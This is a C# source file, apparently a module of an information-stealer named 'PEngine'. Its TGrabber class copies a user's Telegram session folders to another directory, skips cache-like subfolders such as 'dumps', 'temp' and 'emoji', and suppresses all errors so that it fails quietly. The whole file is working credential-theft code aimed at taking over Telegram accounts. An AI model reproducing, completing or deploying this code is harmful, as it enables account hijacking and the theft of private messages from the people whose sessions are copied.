namespace PEngine.Engine.Applications.Telegram
{
    using PEngine.Helpers;
    using System;
    using System.IO;

    public class TGrabber
    {
        public static void GetTelegramSession(string From, string To, string Expansion, bool True = true)
        {
            if (Directory.Exists(From) || (!Directory.Exists(To)))
            {
                try
                {
                    CombineEx.CreateDir(To);
                    foreach (string dirPath in Directory.EnumerateDirectories(From, Expansion, SearchOption.TopDirectoryOnly))
                    {
                        if (!dirPath.Contains("dumps") && (!dirPath.Contains("temp")) && (!dirPath.Contains("user_data")) && (!dirPath.Contains("emoji")))
                        {
                            CombineEx.CreateDir(dirPath?.Replace(From, To));
                            foreach (string newPath in Directory.EnumerateFiles(dirPath, Expansion, SearchOption.TopDirectoryOnly))
                            {
                                try
                                {
                                    CombineEx.FileCopy(newPath, newPath?.Replace(From, To), True);
                                }
                                catch (ArgumentException) { }
                                catch (NotSupportedException) { }
                            }
                        }
                    }
                }
                catch { }
            }
        }
    }
}